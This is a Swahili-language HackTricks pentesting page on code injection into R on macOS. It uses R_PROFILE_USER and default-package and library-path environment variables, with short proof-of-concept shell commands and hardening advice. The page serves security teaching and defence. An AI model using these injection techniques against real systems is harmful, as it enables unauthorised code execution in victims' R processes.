# Injection ya Applications za R kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

## `R_PROFILE_USER` / `R_PROFILE`

Wakati wa kuanza, R husoma faili za wasifu za tovuti na mtumiaji zilizo na code ya R. `R_PROFILE` huchagua wasifu wa tovuti na `R_PROFILE_USER` huchagua wasifu wa mtumiaji, hivyo kuruhusu environment iliyorithiwa kuelekeza upya utafutaji wowote kati ya hizo kwenye faili inayoweza kusomeka na attacker.<sup>[[1]](#references)</sup>
```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```
`--no-init-file` huruka user profile, `--no-site-file` huruka site profile, na `--vanilla` inajumuisha ulinzi wote huo. R kwanza huchakata environment files zilizochaguliwa na `R_ENVIRON` na `R_ENVIRON_USER`, lakini files hizo huweka variables pekee; profile variables ndizo primitive ya moja kwa moja ya arbitrary code.

## `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` na library paths

R hu-attach packages zilizotenganishwa kwa koma katika `R_DEFAULT_PACKAGES` wakati wa kuanzisha. `Rscript` huipa `R_SCRIPT_DEFAULT_PACKAGES` kipaumbele. Kuchanganya mojawapo ya variables hizi na `R_LIBS`, `R_LIBS_USER`, au `R_LIBS_SITE` kunaweza kufanya R itafute na kupakia attacker-controlled installed package; hook yake ya `.onLoad` au `.onAttach` hutekelezwa automatically.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```
Hii inahitaji R package iliyosakinishwa yenye muundo halali, si faili huru la `.R` pekee. `--vanilla` haifuti variables zilizorithiwa moja kwa moja, kwa hivyo wrapper inayoaminika lazima iondoe au ibadilishe variables za default-package na library-path, pamoja na kuzima faili za profile.

## References

- [1] [Uanzishaji Mwanzoni mwa Session ya R](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [2] [Usakinishaji na Usimamizi wa R: Add-on packages](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
{{#include ../../../banners/hacktricks-training.md}}
